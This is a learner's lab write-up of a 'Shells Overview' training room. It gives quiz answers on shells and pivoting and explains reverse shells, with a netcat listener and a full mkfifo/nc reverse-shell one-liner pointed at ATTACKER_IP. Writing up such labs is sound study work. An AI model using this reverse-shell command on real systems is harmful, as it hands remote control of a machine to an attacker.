| [Home](../README.md) | [Cyber Security 101](../README.md#cyber-security-101) | **Shells Overview** |

## Contents
- [Room Introduction](#room-introduction)
- [Reverse Shell](#reverse-shell)


## Room Introduction
Shells, an important function in the attack chain. This room teaches us how to use different sells in offsec, and how to detect them.

There is no question for this task.


## Shell Overview
This section covers how users interact with Shells, with out a GUI. 

The types of shell are **Remove System Control**, having control over a target system, **Privilege Escalation**, having exploited a vulnerability to gain elevated permission, **Data Exfiltration** is where potentially sensitive data can be read and copied off of the target, **Persistence and Maintenance access** describes continued access after the initial _Privilege Escalation_, **Post-Exploitation Activities** describes anything after the initial privilege escalation such as malware installation, data removal, account creation etc., **Access Other Systems on the Network** could be classed as pivoting, accessing other systems on the network.

### ❓ Question
> What is the command-line interface that allows users to interact with an operating system?
#### 🧪 Process
The command-line interface is often classed as a terminal, but in this context we are referring to a `Shell`.

Trying this as the answer
#### ✅ Answer
- `Shell` ✅

### ❓ Question
> What process involves using a compromised system as a launching pad to attack other machines in the network?
#### 🧪 Process
When we have established access, potentially elevated privilages, we may wish to pivot to other systems, otherwise known as `pivoting`.

Trying this as the answer
#### ✅ Answer
- `pivoting` ✅

### ❓ Question
> What is a common activity attackers perform after obtaining shell access to escalate their privileges?
#### 🧪 Process
Once you have established shell access, you will be limited to what you an do until you perform `Privilege Escalation`.

Trying this as the answer
#### ✅ Answer
- `Privilege Escalation` ✅


## Reverse Shell
sometimes refferred to as a '_Connect Back Shell_', a popular technique for gaining access. Connection is tarted from target to attacker. Outbound traffic is often trusted over inbound traffic

### How Reverse Shells Work
We use a Netcat (`nc`) listener `nc -lvnp 443`
What doe the arguments mean?
- `-l` sets up the listener
- `-v` enables the verbose mode
- `-n` prevents DNS look-ups, forces IP
- `-p` as expected specifies a port to listen on.
- `443` in this example we are listing on port 443

We initiate the reverse shell using a vulnerability in a system, Pentest Monkey has a [cheetsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). 

One example
```shell
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`
```

Explanation (Copied directly / needs revision)

> `rm -f /tmp/f` - This command removes any existing named pipe file located at `/tmp/f/`. This ensures that the script can create a new named pipe without conflicts.
> `mkfifo /tmp/f` - This command creates a named pipe, or FIFO (first-in, first-out), at `/tmp/f`. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
> `cat /tmp/f` - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
> `| bash -i 2>&1` - The output of `cat` is piped to a shell instance (`bash -i`), which allows the attacker to execute commands interactively. The `2>&1` redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
> `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f` - This part pipes the shell's output through `nc` (Netcat) to the attacker's IP address (`ATTACKER_IP`) on the attacker's port (`ATTACKER_PORT`).
> `>/tmp/f` -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.

